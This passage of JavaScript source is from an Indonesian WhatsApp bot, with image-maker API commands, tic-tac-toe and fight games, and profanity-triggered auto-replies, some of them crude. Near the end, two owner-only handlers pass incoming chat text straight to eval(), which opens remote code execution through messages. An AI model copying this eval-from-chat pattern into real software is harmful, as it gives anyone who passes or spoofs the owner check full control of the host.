anu = await fetchJson(`https://api-ramdaniofficial.herokuapp.com/api/textpro/captainamerica?apikey=${ramdaniapi}&text1=${F1}&text2=${F2}`)
pornhub = await getBuffer(anu.result)
Ramdani.sendMessage(from, pornhub, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'girlneko':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/girlneko?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'sadboy':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/sadboy?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'kaneki':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(7)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/kaneki?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'rem':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(4)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/rem?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'lolimaker':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(9)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/lolimaker?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break
case 'gura':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
if (args.length < 1) return freply(`*Contoh : ${prefix + command} nama1&nama2*`)
var F = body.slice(5)
var F1 = F.split("&")[0];
var F2 = F.split("&")[1]; 
freply(mess.wait)
girlneko = await getBuffer(`https://api-ramdaniofficial.herokuapp.com/api/maker/gura?apikey=${ramdaniapi}&text=${F1}&text2=${F2}`)
Ramdani.sendMessage(from, girlneko, image, {caption: `*Nih kak dah jadi*`, quoted: mek})
break          
//--------------<fitur tambahan>--------------
case 'tes':
if (!isRegist) return freply(mess.regist)
if (isBanned) return freply(mess.banned)
freply(`dah aktif om🗿`)
break
case 'totalfitur':
freply(`*TOTAL FITUR SAAT IN8 : 538*`)
break

//--------------------------< T E R A K H I R >--------------------------\\
default:
if (fs.existsSync(`./database/game/${from}.json`)) {
	gelutSkuy = setGelud(`${from}`)
	if (sender == `${gelutSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		if (gelutSkuy.status) return freply(`Game telah dimulai sebelumnya!`)
		gelutSkuy.status = true
		rand0m = [ gelutSkuy.Z, gelutSkuy.Y ]
		winR = rand0m[Math.floor(Math.random() * rand0m.length)]
		fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
		starGame = `👑 Gelud Game 🤙🏻 

Diantara @${gelutSkuy.Z} & @${gelutSkuy.Y}
• Pemenangnya adalah [ @${winR} ] `
	   Ramdani.sendMessage(from, starGame, text, {quoted: troli, contextInfo: { mentionedJid: [winR + "@s.whatsapp.net", gelutSkuy.Z + "@s.whatsapp.net", gelutSkuy.Y + "@s.whatsapp.net",]}})
		fs.unlinkSync("./database/game/" + from + ".json");
	} else if (sender == `${gelutSkuy.Y}@s.whatsapp.net` &&  budy.toLowerCase() == 'n') {
		Ramdani.sendMessage(from, `👑 Game Gelud Rejected 🤙🏻
• @${gelutSkuy.Y} Menolak🤙🏻`, text, {quoted: troli, contextInfo: { mentionedJid: [gelutSkuy.Y + "@s.whatsapp.net"]}})
		fs.unlinkSync("./database/game/" + from + ".json");
	}
}

if (isTTT && isPlayer2){
if (budy.startsWith('Y')){
  tto = ky_ttt.filter(ghg => ghg.id.includes(from))
  tty = tto[0]
  angka = tto[0].angka
  ucapan = 
`*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=❎
Player2 @${tty.player2.split('@')[0]}=⭕

Giliran = @${tty.player1.split('@')[0]}

   ${angka[1]}${angka[2]}${angka[3]}
   ${angka[4]}${angka[5]}${angka[6]}
   ${angka[7]}${angka[8]}${angka[9]}`
  Ramdani.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
  }
if (budy.startsWith('N')){
tto = ky_ttt.filter(ghg => ghg.id.includes(from))
tty = tto[0]
naa = ky_ttt.filter(toek => !toek.id.includes(from)) 
ky_ttt = naa
Ramdani.sendMessage(from, `Yahh @${tty.player2.split('@')[0]} Menolak:(`,text,{quoted:troli,contextInfo:{mentionedJid:[tty.player2]}})
}
}

if (isTTT && isPlayer1){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return freply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return freply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return freply('Tunggu Giliran Gan')
s = '❎'
main[0].angka[nuber] = s
main[0].gilir = main[0].player1
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = 
`*🎳Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player1.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
Ramdani.sendMessage(from, ucapan1, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri ??👌_*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
freply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player2 @${tty.player2.split('@')[0]}=⭕
Player1 @${tty.player1.split('@')[0]}=❎

Giliran = @${tty.player2.split('@')[0]}

${ttt}`
Ramdani.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
}
if (isTTT && isPlayer2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return freply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return freply('Udah Di Isi, Isi Yang Lain Gan')
if (main[0].gilir.includes(sender)) return freply('Tunggu Giliran Gan')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].player2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*Yeyyy Permainan Di Menangkan Oleh* @${tty.player2.split('@')[0]}\n
*Ingin bermain lagi? ${prefix}tictactoe*`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
Ramdani.sendMessage(from, ucapan1, text, {quoted:troli, contextInfo:{mentionedJid: [tty.player2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
freply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

Player1 @${tty.player1.split('@')[0]}=⭕
Player2 @${tty.player2.split('@')[0]}=❎
   
Giliran = @${tty.player1.split('@')[0]}

${ttt}`
 Ramdani.sendMessage(from, ucapan, text, {quoted: troli, contextInfo:{mentionedJid: [tty.player1,tty.player2]}})
} else {
}
if (budy.startsWith('>')){
if (!mek.key.fromMe && !isOwner) return
try {
return Ramdani.sendMessage(from, JSON.stringify(eval(budy.slice(2)),null,'\t'),text, {quoted: mek})
} catch(err) {
e = String(err)
freply(e)
}
}
if (!isOwner) return
if (budy.startsWith('+')) {
try {
console.log(color('[ EVAL ]', 'pink'), color(time), budy, color('dari', 'yellow'), pushname, color('di'), isGroup ? groupName : 'Private Chat')
freply(require('util').format(eval(`;(async () => { ${budy.slice(2)} })()`)))
} catch(e) {
console.log(e)
err = String(e)
js = JSON.stringify(e, null, 2)
if (js == '{}') js = { err }
js = JSON.stringify(js, null, 2)
js = '```' + js + '```'
freply('_' + err + '_\n\n' + js)
}
                  }


		if (budy.includes(`bot`)) {

                  freply(`Iya gw Bot, Gak seneng lu?`)

                  }



		if (budy.includes(`bot`)) {

                  freply(`Iya gw Bot, Gak seneng lu?`)

                  }


		if (budy.includes(`Assalamualaikum`)) {

                  freply(`Waalaikumsalam ${pushname}`)

                  }


		if (budy.includes(`P`)) {

                  freply(`Pa pe pa pe, Salam gblk`)

                  }


		if (budy.includes(`Kontol`)) {

                  freply(`_Jangan Toxic anj_`)

                  }


		if (budy.includes(`Ngentod`)) {

                  freply(`_Jangan Toxic anj_`)

                  }


		if (budy.includes(`Kntl`)) {

                  freply(`_Jangan Toxic anj_`)

                  }


		if (budy.includes(`Memek`)) {

                  freply(`_Jangan Toxic anj_`)

                  }


		if (budy.includes(`memek`)) {

                  freply(`_Jangan Toxic anj_`)

                  }


		if (budy.includes(`jembut`)) {

                  freply(`_Jangan Toxic anj_`)

                  }


		if (budy.includes(`kontol`)) {

                  freply(`_Jangan Toxic anj_`)

                  }


		if (budy.includes(`anj`)) {

                  freply(`_Jangan Toxic anj_`)

                  }


		if (budy.includes(`Anjg`)) {

                  freply(`_Jangan Toxic anj_`)

                  }


		if (budy.includes(`Bacot`)) {

                  freply(`Napa lu?`)

                  }
if (!isGroup && isCmd && !mek.key.fromMe){
teks = `Maaf @${senderr.split('@')[0]}, command ${prefix + command} tidak ada dalam menu`
Ramdani.sendMessage(from, {text:teks, jpegThumbnail:fs.readFileSync('./media/foto/emror.jpg')}, 'extendedTextMessage', {sendEphemeral:true, quoted:mek, contextInfo:{ forwardingScore:508, isForwarded:true, mentionedJid:[senderr]}})
}
	} 
if (isGroup && budy != undefined) {
} else {
console.log('[',color('TEXT','aqua'),']',`Message : ${budy} From`, color(pushname))
}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'aqua'))
        }
	}
}



